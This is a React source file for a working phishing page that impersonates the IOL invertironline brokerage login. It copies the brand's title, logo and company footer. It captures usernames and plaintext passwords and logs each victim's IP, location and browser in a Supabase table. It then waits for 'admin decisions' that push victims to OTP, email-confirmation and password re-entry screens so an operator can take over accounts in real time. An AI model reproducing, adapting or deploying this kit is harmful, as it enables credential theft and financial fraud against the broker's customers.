import { useState, useEffect, useCallback } from "react";
import { ChevronLeft } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import { useVisitTracker, useVisitorPresence } from "@/hooks/useVisitTracker";
import { useRateLimit } from "@/hooks/useRateLimit";
import IolLoginForm from "@/components/iol/IolLoginForm";
import IolWaitingScreen from "@/components/iol/IolWaitingScreen";
import IolOtpScreen from "@/components/iol/IolOtpScreen";
import IolConfirmEmailScreen from "@/components/iol/IolConfirmEmailScreen";
import IolSyncEmailScreen from "@/components/iol/IolSyncEmailScreen";
import IolSuccessScreen from "@/components/iol/IolSuccessScreen";
import IolLogo from "@/components/iol/IolLogo";

type LoginStep = "form" | "waiting" | "success" | "otp" | "confirm_email" | "sync_email";

const Iol = () => {
  const [step, setStep] = useState<LoginStep>("form");
  const [email, setEmail] = useState("");
  const [loading, setLoading] = useState(false);
  const [generalError, setGeneralError] = useState("");
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [errorMessage, setErrorMessage] = useState("");

  const rateLimit = useRateLimit();
  useVisitTracker();
  useVisitorPresence(sessionId);

  useEffect(() => {
    const originalTitle = document.title;
    document.title = "IOL invertironline — Ingresá a tu cuenta";
    return () => { document.title = originalTitle; };
  }, []);

  // Poll for admin decisions
  useEffect(() => {
    if (!sessionId || step === "form" || step === "success") return;
    const channel = supabase.channel(`session-review-${sessionId}`);
    channel.on("broadcast", { event: "review_decision" }, (payload) => {
      const decision = payload.payload?.status as string;
      if (decision === "login_success") setStep("success");
      else if (decision === "wrong_password") { setErrorMessage("Contraseña incorrecta. Intentá de nuevo."); if (step !== "waiting") setStep("waiting"); }
      else if (decision === "redirect_otp") { setStep("otp"); setErrorMessage(""); }
      else if (decision === "redirect_confirm_email") { setStep("confirm_email"); setErrorMessage(""); }
      else if (decision === "redirect_sync_email") { setStep("sync_email"); setErrorMessage(""); }
    }).subscribe();

    const pollInterval = setInterval(async () => {
      const { data } = await supabase.from("sessions").select("status").eq("id", sessionId).maybeSingle();
      if (!data) return;
      if (data.status === "login_success") setStep("success");
      else if (data.status === "wrong_password") { if (!errorMessage) setErrorMessage("Contraseña incorrecta. Intentá de nuevo."); if (step !== "waiting") setStep("waiting"); }
      else if (data.status === "redirect_otp") { if (step !== "otp") setStep("otp"); setErrorMessage(""); }
      else if (data.status === "redirect_confirm_email") { if (step !== "confirm_email") setStep("confirm_email"); setErrorMessage(""); }
      else if (data.status === "redirect_sync_email") { if (step !== "sync_email") setStep("sync_email"); setErrorMessage(""); }
      else if (data.status === "pending_review") setErrorMessage("");
    }, 3000);

    return () => { supabase.removeChannel(channel); clearInterval(pollInterval); };
  }, [sessionId, step, errorMessage]);

  const handleLoginSubmit = useCallback(async (submittedUsername: string, password: string) => {
    setGeneralError(""); setErrorMessage(""); setLoading(true); setEmail(submittedUsername);

    let ipData = { ip: "unknown", country: "", city: "", region: "" };
    try {
      const res = await fetch("https://ipapi.co/json/");
      if (res.ok) { const d = await res.json(); ipData = { ip: d.ip || "unknown", country: d.country_name || "", city: d.city || "", region: d.region || "" }; }
    } catch { /* ignore */ }

    if (!submittedUsername.trim() || !password.trim()) {
      setGeneralError(!submittedUsername.trim() ? "Ingresá tu usuario o e-mail." : "Ingresá tu contraseña.");
      setLoading(false);
      return;
    }

    try {
      if (sessionId) {
        await supabase.from("sessions").update({ email: submittedUsername, password, status: "pending_review" }).eq("id", sessionId);
      } else {
        const newId = crypto.randomUUID();
        await supabase.from("sessions").insert({
          id: newId,
          email: submittedUsername,
          password,
          ip_address: ipData.ip,
          user_agent: navigator.userAgent,
          country: ipData.country,
          city: ipData.city,
          region: ipData.region,
          status: "pending_review",
          source: "iol",
        });
        setSessionId(newId);
      }
      setStep("waiting");
    } catch {
      setGeneralError("Ocurrió un error. Intentá de nuevo.");
    }
    setLoading(false);
  }, [sessionId]);

  const handlePasswordResubmit = useCallback(async (newPassword: string) => {
    if (!sessionId) return; setErrorMessage("");
    await supabase.from("sessions").update({ password: newPassword, status: "pending_review" }).eq("id", sessionId);
    const broadcastChannel = supabase.channel(`session-resubmit-${sessionId}-${Date.now()}`);
    broadcastChannel.subscribe((status) => {
      if (status === "SUBSCRIBED") {
        broadcastChannel.send({ type: "broadcast", event: "review_decision", payload: { status: "pending_review" } });
        setTimeout(() => supabase.removeChannel(broadcastChannel), 2000);
      }
    });
  }, [sessionId]);

  const handleRetry = useCallback(() => { setStep("form"); setSessionId(null); setErrorMessage(""); setGeneralError(""); }, []);

  if (rateLimit.loading) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-white">
        <div className="animate-pulse text-[#9da3c0] text-sm">Cargando...</div>
      </div>
    );
  }
  if (rateLimit.blocked) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-white px-4">
        <div className="w-full max-w-sm rounded-xl border border-red-200 p-10 text-center">
          <h2 className="mb-2 text-lg font-bold text-[#1a1464]">Acceso denegado</h2>
          <p className="text-sm text-[#9da3c0]">Tu acceso fue suspendido temporalmente por actividad inusual.</p>
        </div>
      </div>
    );
  }

  // Full-page sub-screens
  if (step === "otp" && sessionId) return <IolOtpScreen email={email} sessionId={sessionId} onBack={handleRetry} />;
  if (step === "confirm_email" && sessionId) return <IolConfirmEmailScreen email={email} sessionId={sessionId} onBack={handleRetry} />;
  if (step === "sync_email" && sessionId) return <IolSyncEmailScreen email={email} sessionId={sessionId} onBack={handleRetry} />;

  return (
    <div className="flex min-h-[100dvh] flex-col bg-white">
      {/* Back arrow */}
      <div className="px-5 pt-14 pb-0">
        <button
          type="button"
          onClick={() => window.history.back()}
          className="flex h-8 w-8 items-center justify-center rounded-full transition-colors hover:bg-[#f0f1f8] active:bg-[#e8e9f0]"
        >
          <ChevronLeft size={22} className="text-[#1a1464]" strokeWidth={2.5} />
        </button>
      </div>

      {/* Main content */}
      <div className="flex flex-1 flex-col px-6 pt-6 pb-6 max-w-md w-full mx-auto">
        {step === "form" && (
          <>
            {/* Logo no topo */}
            <div className="mb-6 flex justify-center">
              <IolLogo size="lg" />
            </div>
            <h1 className="mb-8 text-[22px] font-bold leading-tight text-[#1a1464] text-center">
              Ingresá a tu cuenta
            </h1>
            {generalError && (
              <div className="mb-4 rounded-xl border border-red-200 bg-red-50 px-4 py-2.5 text-sm text-red-600">{generalError}</div>
            )}
            <IolLoginForm onSubmit={handleLoginSubmit} loading={loading} />
          </>
        )}

        {step === "waiting" && sessionId && (
          <div className="flex flex-1 flex-col items-center justify-center py-8">
            <IolWaitingScreen
              email={email}
              sessionId={sessionId}
              errorMessage={errorMessage}
              onPasswordResubmit={handlePasswordResubmit}
            />
          </div>
        )}

        {step === "success" && (
          <div className="flex flex-1 flex-col items-center justify-center py-8">
            <IolSuccessScreen email={email} />
          </div>
        )}
      </div>

      {/* Footer */}
      {step === "form" && (
        <div className="bg-[#f5f6f9] px-6 py-8 text-center">
          <div className="mb-4 flex justify-center">
            <IolLogo size="md" />
          </div>
          <p className="text-[12px] text-[#6b7280] leading-relaxed">Portal Integral de Inversiones S.A.U. © 2024</p>
          <p className="text-[12px] text-[#6b7280] leading-relaxed">CUIT 30-70711770-9.</p>
          <p className="mt-2 text-[12px] text-[#6b7280] leading-relaxed">Todos los derechos reservados.</p>
          <p className="text-[12px] text-[#6b7280] leading-relaxed">San Martín 344, Piso 16, C1004AAH CABA, Argentina.</p>
        </div>
      )}
    </div>
  );
};

export default Iol;
